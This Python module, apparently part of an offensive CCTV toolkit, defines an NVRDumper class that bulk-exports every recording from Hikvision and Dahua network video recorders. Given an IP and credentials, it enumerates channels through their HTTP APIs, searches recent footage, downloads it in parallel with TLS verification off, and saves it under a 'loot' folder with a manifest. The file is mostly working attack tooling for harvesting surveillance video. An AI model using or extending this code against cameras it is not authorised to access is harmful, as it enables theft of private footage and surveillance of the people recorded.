# language: Python, file: core/cctv/nvr_dump.py
# NVR/DVR — bulk export all recordings
import os
import json
import httpx
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor


class NVRDumper:
    """
    يسحب كل تسجيلات NVR/DVR:
      - discovery of channels
      - bulk download parallel
      - manifest
    """

    def __init__(self, output_dir: str = "loot/nvr_dumps",
                  log_queue=None):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        self.log = log_queue

    def _out(self, text):
        if self.log:
            self.log.put(f"[nvr-dump] {text}")

    def dump_hikvision(self, ip: str, port: int, user: str,
                         password: str, days_back: int = 7,
                         max_workers: int = 3) -> dict:
        """
        Dump كامل لـHikvision NVR.
        """
        safe_ip = ip.replace(".", "_")
        dump_dir = os.path.join(self.output_dir, f"hik_{safe_ip}")
        os.makedirs(dump_dir, exist_ok=True)

        self._out(f"dumping Hikvision {ip}")

        # 1. discover channels
        channels = self._hik_channels(ip, port, user, password)
        self._out(f"found {len(channels)} channels")

        # 2. for each channel, list tracks
        all_tracks = []
        for ch in channels:
            tracks = self._hik_tracks(ip, port, user, password,
                                        ch["id"])
            for t in tracks:
                t["channel"] = ch
                all_tracks.append(t)

        self._out(f"found {len(all_tracks)} total tracks")

        # 3. for each track, search + download
        start = (datetime.now() - timedelta(days=days_back))
        end = datetime.now()
        start_str = start.strftime("%Y-%m-%dT%H:%M:%S")
        end_str = end.strftime("%Y-%m-%dT%H:%M:%S")

        all_recordings = []
        for track in all_tracks:
            recordings = self._hik_search(
                ip, port, user, password,
                int(track["id"]), start_str, end_str)
            for r in recordings:
                r["track"] = track
                all_recordings.append(r)

        self._out(f"found {len(all_recordings)} recordings to download")

        # 4. download in parallel
        from core.cctv.playback import PlaybackDownloader
        downloader = PlaybackDownloader(dump_dir, self.log)

        def download_one(idx_rec):
            idx, rec = idx_rec
            ch_id = rec["track"]["channel"]["id"]
            filename = (f"ch{ch_id}_{idx:04d}_"
                        f"{rec['start'][:19].replace(':', '-')}.mp4")
            output = os.path.join(dump_dir, filename)
            return downloader.hikvision_download(
                ip, port, user, password,
                rec["playback_uri"], output)

        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            results = list(ex.map(download_one, enumerate(all_recordings)))

        # 5. manifest
        manifest = {
            "ip": ip,
            "channels": channels,
            "total_recordings": len(all_recordings),
            "downloaded": sum(1 for r in results if r.get("success")),
            "download_results": results,
            "timestamp": datetime.now().isoformat(),
        }
        manifest_path = os.path.join(dump_dir, "manifest.json")
        with open(manifest_path, "w") as f:
            json.dump(manifest, f, indent=2, default=str)

        self._out(f"dump complete: {manifest['downloaded']}/{manifest['total_recordings']}")
        return manifest

    def _hik_channels(self, ip: str, port: int,
                       user: str, password: str) -> list:
        """list all streaming channels"""
        try:
            r = httpx.get(
                f"http://{ip}:{port}/ISAPI/Streaming/channels",
                auth=(user, password), timeout=15, verify=False)
            if r.status_code != 200:
                return []

            import xml.etree.ElementTree as ET
            root = ET.fromstring(r.text)
            channels = []
            for ch in root.iter():
                if ch.tag.endswith("StreamingChannel"):
                    cid = ch.findtext(".//{*}id")
                    if cid:
                        channels.append({
                            "id": cid,
                            "name": ch.findtext(".//{*}channelName") or f"ch{cid}",
                        })
            return channels
        except Exception as e:
            self._out(f"channels error: {e}")
            return []

    def _hik_tracks(self, ip: str, port: int,
                     user: str, password: str,
                     channel_id: str) -> list:
        """list record tracks for channel"""
        try:
            r = httpx.get(
                f"http://{ip}:{port}/ISAPI/ContentMgmt/record/tracks"
                f"?channel={channel_id}",
                auth=(user, password), timeout=15, verify=False)
            if r.status_code != 200:
                return []

            import xml.etree.ElementTree as ET
            root = ET.fromstring(r.text)
            tracks = []
            for t in root.iter():
                if t.tag.endswith("Track"):
                    tid = t.findtext(".//{*}id")
                    if tid:
                        tracks.append({
                            "id": tid,
                            "channel_id": channel_id,
                            "desc": t.findtext(".//{*}Description") or "",
                        })
            return tracks
        except Exception:
            return []

    def _hik_search(self, ip: str, port: int, user: str,
                     password: str, track_id: int,
                     start: str, end: str) -> list:
        """search recordings"""
        from core.cctv.playback import PlaybackDownloader
        downloader = PlaybackDownloader(log_queue=self.log)
        return downloader.hikvision_search(
            ip, port, user, password, track_id, start, end)

    def dump_dahua(self, ip: str, port: int, user: str,
                     password: str, days_back: int = 7) -> dict:
        """Dump كامل لـDahua NVR"""
        safe_ip = ip.replace(".", "_")
        dump_dir = os.path.join(self.output_dir, f"dahua_{safe_ip}")
        os.makedirs(dump_dir, exist_ok=True)

        self._out(f"dumping Dahua {ip}")

        try:
            from core.cctv.dahua import DahuaAPI
            dahua = DahuaAPI(ip, port, user, password)
            login = dahua.login()
            if login.get("error"):
                return {"error": login["error"]}

            # list channels
            channels = dahua.list_channels()
            self._out(f"found {len(channels)} channels")

            start = (datetime.now() - timedelta(days=days_back)).strftime(
                "%Y-%m-%d %H:%M:%S")
            end = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # for each channel, list and download
            from core.cctv.playback import PlaybackDownloader
            downloader = PlaybackDownloader(dump_dir, self.log)

            all_files = []
            for ch in channels[:10]:  # limit
                ch_id = ch.get("Channel", 1)
                files = downloader.dahua_list_recordings(
                    ip, port, user, password, ch_id, start, end)
                self._out(f"ch{ch_id}: {len(files)} files")
                for f in files:
                    all_files.append({"channel": ch_id, **f})

            # download
            results = []
            for i, f in enumerate(all_files[:100]):
                output = os.path.join(
                    dump_dir,
                    f"ch{f['channel']}_{i:04d}.dav")
                result = downloader.dahua_download(
                    ip, port, user, password,
                    f["channel"], f.get("StartTime", start),
                    f.get("EndTime", end), output)
                results.append(result)

            manifest = {
                "ip": ip,
                "channels": len(channels),
                "total_files": len(all_files),
                "downloaded": sum(1 for r in results if r.get("success")),
                "results": results,
                "timestamp": datetime.now().isoformat(),
            }
            with open(os.path.join(dump_dir, "manifest.json"), "w") as f:
                json.dump(manifest, f, indent=2, default=str)

            return manifest
        except Exception as e:
            return {"error": str(e)}
